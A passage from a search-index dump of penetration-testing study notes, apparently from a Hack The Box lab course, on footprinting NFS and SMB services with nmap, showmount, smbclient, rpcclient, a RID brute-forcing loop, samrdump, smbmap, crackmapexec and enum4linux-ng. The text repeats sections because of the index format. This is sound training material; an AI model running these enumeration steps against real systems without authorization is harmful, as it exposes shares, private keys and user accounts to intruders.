scanned in 6.58 seconds The rpcinfo NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This lets us check whether the target share is connected to the network on all required ports. hrmns@htb[/htb]$ sudo nmap --script nfs* 10 .129.14.128 -sV -p111,2049 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST Nmap scan report for 10.129.14.128 Host is up (0.00021s latency). PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | nfs-ls: Volume /mnt/nfs | access: Read Lookup NoModify NoExtend NoDelete NoExecute | PERMISSION UID GID SIZE TIME FILENAME | rwxrwxrwx 65534 65534 4096 2021-09-19T15:28:17 . | ?????????? ? ? ? ? .. | rw-r--r-- 0 0 1872 2021-09-19T15:27:42 id_rsa | rw-r--r-- 0 0 348 2021-09-19T15:28:17 id_rsa.pub | rw-r--r-- 0 0 0 2021-09-19T15:22:30 nfs.share |_ | nfs-showmount: |_ /mnt/nfs 10.129.14.0/24 | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /mnt/nfs 30313412.0 8074868.0 20675664.0 29% 16.0T 32000 | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 41982/udp6 mountd | 100005 1,2,3 45837/tcp mountd | 100005 1,2,3 47217/tcp6 mountd | 100005 1,2,3 58830/udp mountd | 100021 1,3,4 39542/udp nlockmgr | 100021 1,3,4 44629/tcp nlockmgr | 100021 1,3,4 45273/tcp6 nlockmgr | 100021 1,3,4 47524/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds Once discovered an NFS service, we can mount it on our local machine. Show available NFS Shares hrmns@htb[/htb]$ showmount -e 10 .129.14.128 Export list for 10.129.14.128: /mnt/nfs 10.129.14.0/24 Mount NFS Share hrmns@htb[/htb]$ mkdir target-NFS hrmns@htb[/htb]$ mount -t nfs 10 .129.14.128:/ ./target-NFS/ -o nolock hrmns@htb[/htb]$ cd target-NFS hrmns@htb[/htb]$ tree . . \u2514\u2500\u2500 mnt \u2514\u2500\u2500 nfs \u251c\u2500\u2500 id_rsa \u251c\u2500\u2500 id_rsa.pub \u2514\u2500\u2500 nfs.share 2 directories, 3 files List Contents with Usernames & Group Names hrmns@htb[/htb]$ ls -l mnt/nfs/ total 16 -rw-r--r-- 1 root root 1872 Sep 19 17:27 id_rsa -rw-r--r-- 1 root root 348 Sep 19 17:28 id_rsa.pub -rw-r--r-- 1 root root 0 Sep 19 17:22 nfs.share List Contents with UIDs & GUIDs hrmns@htb[/htb]$ ls -n mnt/nfs/ total 16 -rw-r--r-- 1 0 0 1872 Sep 19 17:27 id_rsa -rw-r--r-- 1 0 0 348 Sep 19 17:28 id_rsa.pub -rw-r--r-- 1 0 0 0 Sep 19 17:22 nfs.share Unmounting hrmns@htb[/htb]$ cd .. hrmns@htb[/htb]$ umount ./target-NFS","title":"NFS"},{"location":"footprinting/nfs/#default-config","text":"The /etc/exports file contains a table of physical filesystems on an NFS server accessible by the clients. The NFS Exports Table shows which options it accepts and thus indicates which options are available to us. hrmns@htb[/htb]$ cat /etc/exports # /etc/exports: the access control list for filesystems which may be exported # to NFS clients. See exports ( 5 ) . # # Example for NFSv2 and NFSv3: # /srv/homes hostname1 ( rw,sync,no_subtree_check ) hostname2 ( ro,sync,no_subtree_check ) # # Example for NFSv4: # /srv/nfs4 gss/krb5i ( rw,sync,fsid = 0 ,crossmnt,no_subtree_check ) # /srv/nfs4/homes gss/krb5i ( rw,sync,no_subtree_check ) The default exports file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets.","title":"Default Config"},{"location":"footprinting/nfs/#creating-entry","text":"root@nfs:~# echo '/mnt/nfs 10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports root@nfs:~# systemctl restart nfs-kernel-server root@nfs:~# exportfs /mnt/nfs 10.129.14.0/24","title":"Creating  entry"},{"location":"footprinting/nfs/#dangerous-settings","text":"Option Description rw Read and write permissions. insecure Ports above 1024 will be used. nohide If another file system was mounted below an exported directory, this directory is exported by its own exports entry. no_root_squash All files created by root are kept with the UID/GID 0.","title":"Dangerous Settings"},{"location":"footprinting/nfs/#footprinting-the-server","text":"When footprinting NFS, the TCP ports 111 and 2049 are essential. hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -p111,2049 -sV -sC Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST Nmap scan report for 10.129.14.128 Host is up (0.00018s latency). PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 41982/udp6 mountd | 100005 1,2,3 45837/tcp mountd | 100005 1,2,3 47217/tcp6 mountd | 100005 1,2,3 58830/udp mountd | 100021 1,3,4 39542/udp nlockmgr | 100021 1,3,4 44629/tcp nlockmgr | 100021 1,3,4 45273/tcp6 nlockmgr | 100021 1,3,4 47524/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds The rpcinfo NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This lets us check whether the target share is connected to the network on all required ports. hrmns@htb[/htb]$ sudo nmap --script nfs* 10 .129.14.128 -sV -p111,2049 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST Nmap scan report for 10.129.14.128 Host is up (0.00021s latency). PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | nfs-ls: Volume /mnt/nfs | access: Read Lookup NoModify NoExtend NoDelete NoExecute | PERMISSION UID GID SIZE TIME FILENAME | rwxrwxrwx 65534 65534 4096 2021-09-19T15:28:17 . | ?????????? ? ? ? ? .. | rw-r--r-- 0 0 1872 2021-09-19T15:27:42 id_rsa | rw-r--r-- 0 0 348 2021-09-19T15:28:17 id_rsa.pub | rw-r--r-- 0 0 0 2021-09-19T15:22:30 nfs.share |_ | nfs-showmount: |_ /mnt/nfs 10.129.14.0/24 | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /mnt/nfs 30313412.0 8074868.0 20675664.0 29% 16.0T 32000 | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 41982/udp6 mountd | 100005 1,2,3 45837/tcp mountd | 100005 1,2,3 47217/tcp6 mountd | 100005 1,2,3 58830/udp mountd | 100021 1,3,4 39542/udp nlockmgr | 100021 1,3,4 44629/tcp nlockmgr | 100021 1,3,4 45273/tcp6 nlockmgr | 100021 1,3,4 47524/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds Once discovered an NFS service, we can mount it on our local machine. Show available NFS Shares hrmns@htb[/htb]$ showmount -e 10 .129.14.128 Export list for 10.129.14.128: /mnt/nfs 10.129.14.0/24 Mount NFS Share hrmns@htb[/htb]$ mkdir target-NFS hrmns@htb[/htb]$ mount -t nfs 10 .129.14.128:/ ./target-NFS/ -o nolock hrmns@htb[/htb]$ cd target-NFS hrmns@htb[/htb]$ tree . . \u2514\u2500\u2500 mnt \u2514\u2500\u2500 nfs \u251c\u2500\u2500 id_rsa \u251c\u2500\u2500 id_rsa.pub \u2514\u2500\u2500 nfs.share 2 directories, 3 files List Contents with Usernames & Group Names hrmns@htb[/htb]$ ls -l mnt/nfs/ total 16 -rw-r--r-- 1 root root 1872 Sep 19 17:27 id_rsa -rw-r--r-- 1 root root 348 Sep 19 17:28 id_rsa.pub -rw-r--r-- 1 root root 0 Sep 19 17:22 nfs.share List Contents with UIDs & GUIDs hrmns@htb[/htb]$ ls -n mnt/nfs/ total 16 -rw-r--r-- 1 0 0 1872 Sep 19 17:27 id_rsa -rw-r--r-- 1 0 0 348 Sep 19 17:28 id_rsa.pub -rw-r--r-- 1 0 0 0 Sep 19 17:22 nfs.share Unmounting hrmns@htb[/htb]$ cd .. hrmns@htb[/htb]$ umount ./target-NFS","title":"Footprinting the Server"},{"location":"footprinting/smb/","text":"Default Configuration \u00b6 hrmns@htb[/htb]$ cat /etc/samba/smb.conf | grep -v \"#\\|\\;\" [global] workgroup = DEV.INFREIGHT.HTB server string = DEVSMB log file = /var/log/samba/log.%m max log size = 1000 logging = file panic action = /usr/share/samba/panic-action %d server role = standalone server obey pam restrictions = yes unix password sync = yes passwd program = /usr/bin/passwd %u passwd chat = *Enter\\snew\\s*\\spassword:* %n\\n *Retype\\snew\\s*\\spassword:* %n\\n *password\\supdated\\ssuccessfully* . pam password change = yes map to guest = bad user usershare allow guests = yes [printers] comment = All Printers browseable = no path = /var/spool/samba printable = yes guest ok = no read only = yes create mask = 0700 [print$] comment = Printer Drivers path = /var/lib/samba/printers browseable = yes read only = yes guest ok = no \u00b6 Dangerous Settings \u00b6 Setting Description browseable = yes Allow listing available shares in the current share? read only = no Forbid the creation and modification of files? writable = yes Allow users to create and modify files? guest ok = yes Allow connecting to the service without using a password? enable privileges = yes Honor privileges assigned to specific SID? create mask = 0777 What permissions must be assigned to the newly created files? directory mask = 0777 What permissions must be assigned to the newly created directories? logon script = script.sh What script needs to be executed on the user's login? magic script = script.sh Which script should be executed when the script gets closed? magic output = script.out Where the output of the magic script needs to be stored? Restart Samba root@samba:~# sudo systemctl restart smbd SMBclient - Connecting to the Share \u00b6 display a list ( -L ), null session ( -N ) which is anonymous access without the input of existing users or valid passwords hrmns@htb[/htb]$ smbclient -N -L //10.129.14.128 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers home Disk INFREIGHT Samba dev Disk DEVenv notes Disk CheckIT IPC$ IPC IPC Service (DEVSM) SMB1 disabled -- no workgroup available e.g. inspect notes share hrmns@htb[/htb]$ smbclient //10.129.14.128/notes Enter WORKGROUP\\<username>'s password: Anonymous login successful Try \"help\" to get a list of possible commands. smb: \\> help ? allinfo altname archive backup blocksize cancel case_sensitive cd chmod chown close del deltree dir du echo exit get getfacl geteas hardlink help history iosize lcd link lock lowercase ls l mask md mget mkdir more mput newer notify open posix posix_encrypt posix_open posix_mkdir posix_rmdir posix_unlink posix_whoami print prompt put pwd q queue quit readlink rd recurse reget rename reput rm rmdir showacls setea setmode scopy stat symlink tar tarmode timeout translate unlock volume vuid wdel logon listconnect showconnect tcon tdis tid utimes logoff .. ! smb: \\> ls . D 0 Wed Sep 22 18:17:51 2021 .. D 0 Wed Sep 22 12:03:59 2021 prep-prod.txt N 71 Sun Sep 19 15:45:21 2021 30313412 blocks of size 1024. 16480084 blocks available Download with get command, execute local system commands using ! at beginning ( !<cmd> ) smb: \\> get prep-prod.txt getting file \\prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) (average 8,7 KiloBytes/sec) smb: \\> !ls prep-prod.txt smb: \\> !cat prep-prod.txt [] check your code with the templates [] run code-assessment.py [] \u2026 Check connections using smbstatus root@samba:~# smbstatus Samba version 4.11.6-Ubuntu PID Username Group Machine Protocol Version Encryption Signing ---------------------------------------------------------------------------------------------------------------------------------------- 75691 sambauser samba 10.10.14.4 (ipv4:10.10.14.4:45564) SMB3_11 - - Service pid Machine Connected at Encryption Signing --------------------------------------------------------------------------------------------- notes 75691 10.10.14.4 Do Sep 23 00:12:06 2021 CEST - - No locked files Footprinting the Service \u00b6 Nmap hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -sV -sC -p139,445 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST Nmap scan report for sharing.inlanefreight.htb (10.129.14.128) Host is up (0.00024s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 MAC Address: 00:00:00:00:00:00 (VMware) Host script results: |_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-09-19T13:16:04 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds RPCclient hrmns@htb[/htb]$ rpcclient -U \"\" 10 .129.14.128 Enter WORKGROUP\\'s password: rpcclient $> RPCclient - Enumeration rpcclient $> srvinfo DEVSMB Wk Sv PrQ Unx NT SNT DEVSM platform_id : 500 os version : 6.1 server type : 0x809a03 rpcclient $> enumdomains name:[DEVSMB] idx:[0x0] name:[Builtin] idx:[0x1] rpcclient $> querydominfo Domain: DEVOPS Server: DEVSMB Comment: DEVSM Total Users: 2 Total Groups: 0 Total Aliases: 0 Sequence No: 1632361158 Force Logoff: -1 Domain Server State: 0x1 Server Role: ROLE_DOMAIN_PDC Unknown 3: 0x1 rpcclient $> netshareenumall netname: print$ remark: Printer Drivers path: C:\\var\\lib\\samba\\printers password: netname: home remark: INFREIGHT Samba path: C:\\home\\ password: netname: dev remark: DEVenv path: C:\\home\\sambauser\\dev\\ password: netname: notes remark: CheckIT path: C:\\mnt\\notes\\ password: netname: IPC$ remark: IPC Service (DEVSM) path: C:\\tmp password: rpcclient $> netsharegetinfo notes netname: notes remark: CheckIT path: C:\\mnt\\notes\\ password: type: 0x0 perms: 0 max_uses: -1 num_uses: 1 revision: 1 type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE DACL ACL Num ACEs: 1 revision: 2 --- ACE type: ACCESS ALLOWED (0) flags: 0x00 Specific bits: 0x1ff Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS SID: S-1-1-0 These examples show us what information can be leaked to anonymous users. Once an anonymous user has access to a network service, it only takes one mistake to give them too many permissions or too much visibility to put the entire network at significant risk. Rpcclient - User Enumeration rpcclient $> enumdomusers user:[mrb3n] rid:[0x3e8] user:[cry0l1t3] rid:[0x3e9] rpcclient $> queryuser 0x3e9 User Name : cry0l1t3 Full Name : cry0l1t3 Home Drive : \\\\devsmb\\cry0l1t3 Dir Drive : Profile Path: \\\\devsmb\\cry0l1t3\\profile Logon Script: Description : Workstations: Comment : Remote Dial : Logon Time : Do, 01 Jan 1970 01:00:00 CET Logoff Time : Mi, 06 Feb 2036 16:06:39 CET Kickoff Time : Mi, 06 Feb 2036 16:06:39 CET Password last set Time : Mi, 22 Sep 2021 17:50:56 CEST Password can change Time : Mi, 22 Sep 2021 17:50:56 CEST Password must change Time: Do, 14 Sep 30828 04:48:05 CEST unknown_2[0..31]... user_rid : 0x3e9 group_rid: 0x201 acb_info : 0x00000014 fields_present: 0x00ffffff logon_divs: 168 bad_password_count: 0x00000000 logon_count: 0x00000000 padding1[0..7]... logon_hrs[0..21]... rpcclient $> queryuser 0x3e8 User Name : mrb3n Full Name : Home Drive : \\\\devsmb\\mrb3n Dir Drive : Profile Path: \\\\devsmb\\mrb3n\\profile Logon Script: Description : Workstations: Comment : Remote Dial : Logon Time : Do, 01 Jan 1970 01:00:00 CET Logoff Time : Mi, 06 Feb 2036 16:06:39 CET Kickoff Time : Mi, 06 Feb 2036 16:06:39 CET Password last set Time : Mi, 22 Sep 2021 17:47:59 CEST Password can change Time : Mi, 22 Sep 2021 17:47:59 CEST Password must change Time: Do, 14 Sep 30828 04:48:05 CEST unknown_2[0..31]... user_rid : 0x3e8 group_rid: 0x201 acb_info : 0x00000010 fields_present: 0x00ffffff logon_divs: 168 bad_password_count: 0x00000000 logon_count: 0x00000000 padding1[0..7]... logon_hrs[0..21]... Rpcclient - Group Information rpcclient $> querygroup 0x201 Group Name: None Description: Ordinary Users Group Attribute:7 Num Members:2 Brute Forcing User RIDs hrmns@htb [ /htb ] $ for i in $( seq 500 1100 ) ; do rpcclient -N -U \"\" 10 .129.14.128 -c \"queryuser 0x $( printf '%x\\n' $i ) \" | grep \"User Name\\|user_rid\\|group_rid\" && echo \"\" ; done User Name : sambauser user_rid : 0x1f5 group_rid: 0x201 User Name : mrb3n user_rid : 0x3e8 group_rid: 0x201 User Name : cry0l1t3 user_rid : 0x3e9 group_rid: 0x201 Alternative: Python script from Impacket called samrdump.py hrmns@htb[/htb]$ samrdump.py 10 .129.14.128 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Retrieving endpoint list from 10.129.14.128 Found domain(s): . DEVSMB . Builtin [*] Looking up users in domain DEVSMB Found user: mrb3n, uid = 1000 Found user: cry0l1t3, uid = 1001 mrb3n (1000)/FullName: mrb3n (1000)/UserComment: mrb3n (1000)/PrimaryGroupId: 513 mrb3n (1000)/BadPasswordCount: 0 mrb3n (1000)/LogonCount: 0 mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59 mrb3n (1000)/PasswordDoesNotExpire: False mrb3n (1000)/AccountIsDisabled: False mrb3n (1000)/ScriptPath: cry0l1t3 (1001)/FullName: cry0l1t3 cry0l1t3 (1001)/UserComment: cry0l1t3 (1001)/PrimaryGroupId: 513 cry0l1t3 (1001)/BadPasswordCount: 0 cry0l1t3 (1001)/LogonCount: 0 cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56 cry0l1t3 (1001)/PasswordDoesNotExpire: False cry0l1t3 (1001)/AccountIsDisabled: False cry0l1t3 (1001)/ScriptPath: [*] Received 2 entries. The information we have already obtained with rpcclient can also be obtained using other tools. For example, the SMBMap and CrackMapExec tools are also widely used and helpful for the enumeration of SMB services. SMBmap hrmns@htb[/htb]$ smbmap -H 10 .129.14.128 [+] Finding open SMB ports.... [+] User SMB session established on 10.129.14.128... [+] IP: 10.129.14.128:445 Name: 10.129.14.128 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers home NO ACCESS INFREIGHT Samba dev NO ACCESS DEVenv notes NO ACCESS CheckIT IPC$ NO ACCESS IPC Service (DEVSM) CrackMapExec hrmns@htb[/htb]$ crackmapexec smb 10 .129.14.128 --shares -u '' -p '' SMB 10.129.14.128 445 DEVSMB [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False) SMB 10.129.14.128 445 DEVSMB [+] \\: SMB 10.129.14.128 445 DEVSMB [+] Enumerated shares SMB 10.129.14.128 445 DEVSMB Share Permissions Remark SMB 10.129.14.128 445 DEVSMB ----- ----------- ------ SMB 10.129.14.128 445 DEVSMB print$ Printer Drivers SMB 10.129.14.128 445 DEVSMB home INFREIGHT Samba SMB 10.129.14.128 445 DEVSMB dev DEVenv SMB 10.129.14.128 445 DEVSMB notes READ,WRITE CheckIT SMB 10.129.14.128 445 DEVSMB IPC$ IPC Service (DEVSM) enum4linux-ng , which is based on an older tool, enum4linux. This tool automates many of the queries, but not all, and can return a large amount of information. Install hrmns@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git hrmns@htb[/htb]$ cd enum4linux-ng hrmns@htb[/htb]$ pip3 install -r requirements.txt Enumeration hrmns@htb[/htb]$ ./enum4linux-ng.py 10 .129.14.128 -A ENUM4LINUX - next generation ========================== | Target Information | ========================== [*] Target ........... 10.129.14.128 [*] Username ......... '' [*] Random Username .. 'juzgtcsu' [*] Password ......... '' [*] Timeout .......... 5 second(s) ===================================== | Service Scan on 10.129.14.128 | ===================================== [*] Checking LDAP [-] Could not connect to LDAP on 389/tcp: connection refused [*] Checking LDAPS [-] Could not connect to LDAPS on 636/tcp: connection refused [*] Checking SMB [+] SMB is accessible on 445/tcp [*] Checking SMB over NetBIOS [+] SMB over NetBIOS is accessible on 139/tcp ===================================================== | NetBIOS Names and Workgroup for 10.129.14.128 | ===================================================== [+] Got domain/workgroup name: DEVOPS [+] Full NetBIOS names information: - DEVSMB <00> - H <ACTIVE> Workstation Service - DEVSMB <03> - H <ACTIVE> Messenger Service - DEVSMB <20> - H <ACTIVE> File Server Service - ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE> Master Browser - DEVOPS <00> - <GROUP> H <ACTIVE> Domain/Workgroup Name - DEVOPS <1d> - H <ACTIVE> Master Browser - DEVOPS <1e> - <GROUP> H <ACTIVE> Browser Service Elections - MAC Address = 00-00-00-00-00-00 ========================================== | SMB Dialect Check on 10.129.14.128 | ========================================== [*] Trying on 445/tcp [+] Supported dialects and settings: SMB 1.0: false SMB 2.02: true SMB 2.1: true SMB 3.0: true SMB1 only: false Preferred dialect: SMB 3.0 SMB signing required: false ========================================== | RPC Session Check on 10.129.14.128 | ========================================== [*] Check for null session [+] Server allows session using username '', password '' [*] Check for random user session [+] Server allows session using username 'juzgtcsu', password '' [H] Rerunning enumeration with user 'juzgtcsu' might give more results ==================================================== | Domain Information via RPC for 10.129.14.128 | ==================================================== [+] Domain: DEVOPS [+] SID: NULL SID [+] Host is part of a workgroup (not a domain) ============================================================ | Domain Information via SMB session for 10.129.14.128 | ============================================================ [*] Enumerating via unauthenticated SMB session on 445/tcp [+] Found domain information via SMB NetBIOS computer name: DEVSMB NetBIOS domain name: '' DNS domain: '' FQDN: htb ================================================ | OS Information via RPC for 10.129.14.128 | ================================================ [*] Enumerating via unauthenticated SMB session on 445/tcp [+] Found OS information via SMB [*] Enumerating via 'srvinfo' [+] Found OS information via 'srvinfo' [+] After merging OS information we have the following result: OS: Windows 7, Windows Server 2008 R2 OS version: '6.1' OS release: '' OS build: '0' Native OS: not supported Native LAN manager: not supported Platform id: '500' Server type: '0x809a03' Server type string: Wk Sv PrQ Unx NT SNT DEVSM ====================================== | Users via RPC on 10.129.14.128 | ====================================== [*] Enumerating users via 'querydispinfo' [+] Found 2 users via 'querydispinfo' [*] Enumerating users via 'enumdomusers' [+] Found 2 users via 'enumdomusers' [+] After merging user results we have 2 users total: '1000': username: mrb3n name: '' acb: '0x00000010' description: '' '1001': username: cry0l1t3 name: cry0l1t3 acb: '0x00000014' description: '' ======================================= | Groups via RPC on 10.129.14.128 | ======================================= [*] Enumerating local groups [+] Found 0 group(s) via 'enumalsgroups domain' [*] Enumerating builtin groups [+] Found 0 group(s) via 'enumalsgroups builtin' [*] Enumerating domain groups [+] Found 0 group(s) via 'enumdomgroups' ======================================= | Shares via RPC on 10.129.14.128 | ======================================= [*] Enumerating shares [+] Found 5 share(s): IPC$: comment: IPC Service (DEVSM) type: IPC dev: comment: DEVenv type: Disk home: comment: INFREIGHT Samba type: Disk notes: comment: CheckIT type: Disk print$: comment: Printer Drivers type: Disk [*] Testing share IPC$ [-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND [*] Testing share dev [-] Share doesn't exist [*] Testing share home [+] Mapping: OK, Listing: OK [*] Testing share notes [+] Mapping: OK, Listing: OK [*] Testing share print$ [+] Mapping: DENIED, Listing: N/A ========================================== | Policies via RPC for 10.129.14.128 | ========================================== [*] Trying port 445/tcp [+] Found policy: domain_password_information: pw_history_length: None min_pw_length: 5 min_pw_age: none max_pw_age: 49710 days 6 hours 21 minutes pw_properties: - DOMAIN_PASSWORD_COMPLEX: false - DOMAIN_PASSWORD_NO_ANON_CHANGE: false - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false domain_lockout_information: lockout_observation_window: 30 minutes lockout_duration: 30 minutes lockout_threshold: None domain_logoff_information: force_logoff_time: 49710 days 6 hours 21 minutes ========================================== | Printers via RPC for 10.129.14.128 | ========================================== [+] No printers returned (this is not an error) Completed after 0.61 seconds Use more than two tools for enumeration. Because it can happen that due to the programming of the tools, we get different information that we have to check manually. Therefore, we should never rely only on automated tools where we do not know precisely how they were written.","title":"SMB"},{"location":"footprinting/smb/#default-configuration","text":"","title":"Default Configuration"},{"location":"footprinting/smb/#hrmnshtbhtb-cat-etcsambasmbconf-grep-v-global-workgroup-devinfreighthtb-server-string-devsmb-log-file-varlogsambalogm-max-log-size-1000-logging-file-panic-action-usrsharesambapanic-action-d-server-role-standalone-server-obey-pam-restrictions-yes-unix-password-sync-yes-passwd-program-usrbinpasswd-u-passwd-chat-entersnewsspassword-nn-retypesnewsspassword-nn-passwordsupdatedssuccessfully-pam-password-change-yes-map-to-guest-bad-user-usershare-allow-guests-yes-printers-comment-all-printers-browseable-no-path-varspoolsamba-printable-yes-guest-ok-no-read-only-yes-create-mask-0700-print-comment-printer-drivers-path-varlibsambaprinters-browseable-yes-read-only-yes-guest-ok-no","text":"","title":"hrmns@htb[/htb]$ cat /etc/samba/smb.conf | grep -v &quot;#\\|\\;&quot; \n\n[global]\n   workgroup = DEV.INFREIGHT.HTB\n   server string = DEVSMB\n   log file = /var/log/samba/log.%m\n   max log size = 1000\n   logging = file\n   panic action = /usr/share/samba/panic-action %d\n\n   server role = standalone server\n   obey pam restrictions = yes\n   unix password sync = yes\n\n   passwd program = /usr/bin/passwd %u\n   passwd chat = *Enter\\snew\\s*\\spassword:* %n\\n *Retype\\snew\\s*\\spassword:* %n\\n *password\\supdated\\ssuccessfully* .\n\n   pam password change = yes\n   map to guest = bad user\n   usershare allow guests = yes\n\n[printers]\n   comment = All Printers\n   browseable = no\n   path = /var/spool/samba\n   printable = yes\n   guest ok = no\n   read only = yes\n   create mask = 0700\n\n[print$]\n   comment = Printer Drivers\n   path = /var/lib/samba/printers\n   browseable = yes\n   read only = yes\n   guest ok = no\n"},{"location":"footprinting/smb/#dangerous-settings","text":"Setting Description browseable = yes Allow listing available shares in the current share? read only = no Forbid the creation and modification of files? writable = yes Allow users to create and modify files? guest ok = yes Allow connecting to the service without using a password? enable privileges = yes Honor privileges assigned to specific SID? create mask = 0777 What permissions must be assigned to the newly created files? directory mask = 0777 What permissions must be assigned to the newly created directories? logon script = script.sh What script needs to be executed on the user's login? magic script = script.sh Which script should be executed when the script gets closed? magic output = script.out Where the output of the magic script needs to be stored? Restart Samba root@samba:~# sudo systemctl restart smbd","title":"Dangerous Settings"},{"location":"footprinting/smb/#smbclient-connecting-to-the-share","text":"display a list ( -L ), null session ( -N ) which is anonymous access without the input of existing users or valid passwords hrmns@htb[/htb]$ smbclient -N -L //10.129.14.128 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers home Disk INFREIGHT Samba dev Disk DEVenv notes Disk CheckIT IPC$ IPC IPC Service (DEVSM) SMB1 disabled -- no workgroup available e.g. inspect notes share hrmns@htb[/htb]$ smbclient //10.129.14.128/notes Enter WORKGROUP\\<username>'s password: Anonymous login successful Try \"help\" to get a list of possible commands. smb: \\> help ? allinfo altname archive backup blocksize cancel case_sensitive cd chmod chown close del deltree dir du echo exit get getfacl geteas hardlink help history iosize lcd link lock lowercase ls l mask md mget mkdir more mput newer notify open posix posix_encrypt posix_open posix_mkdir posix_rmdir posix_unlink posix_whoami print prompt put pwd q queue quit readlink rd recurse reget rename reput rm rmdir showacls setea setmode scopy stat symlink tar tarmode timeout translate unlock volume vuid wdel logon listconnect showconnect tcon tdis tid utimes logoff .. ! smb: \\> ls . D 0 Wed Sep 22 18:17:51 2021 .. D 0 Wed Sep 22 12:03:59 2021 prep-prod.txt N 71 Sun Sep 19 15:45:21 2021 30313412 blocks of size 1024. 16480084 blocks available Download with get command, execute local system commands using ! at beginning ( !<cmd> ) smb: \\> get prep-prod.txt getting file \\prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) (average 8,7 KiloBytes/sec) smb: \\> !ls prep-prod.txt smb: \\> !cat prep-prod.txt [] check your code with the templates [] run code-assessment.py [] \u2026 Check connections using smbstatus root@samba:~# smbstatus Samba version 4.11.6-Ubuntu PID Username Group Machine Protocol Version Encryption Signing ---------------------------------------------------------------------------------------------------------------------------------------- 75691 sambauser samba 10.10.14.4 (ipv4:10.10.14.4:45564) SMB3_11 - - Service pid Machine Connected at Encryption Signing --------------------------------------------------------------------------------------------- notes 75691 10.10.14.4 Do Sep 23 00:12:06 2021 CEST - - No locked files","title":"SMBclient - Connecting to the Share"},{"location":"footprinting/smb/#footprinting-the-service","text":"Nmap hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -sV -sC 